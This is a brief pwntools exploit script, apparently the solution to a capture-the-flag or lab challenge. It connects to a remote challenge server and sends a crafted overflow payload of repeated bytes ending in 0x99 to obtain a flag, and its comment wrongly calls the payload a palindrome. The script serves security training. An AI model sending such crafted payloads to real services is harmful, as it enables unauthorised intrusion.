from pwn import *

# elf = ELF('./client')  # untuk ambil offset simbol
p = remote('sisterlab.id', 42005)

# Langkah 1: kirim palindrome agar masuk fgets()
payload = b"AAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + b"\x99"
p.recvuntil(b'Enter your string: ')
p.send(payload + b"\n")

# Interaktif untuk lihat flag
p.interactive()
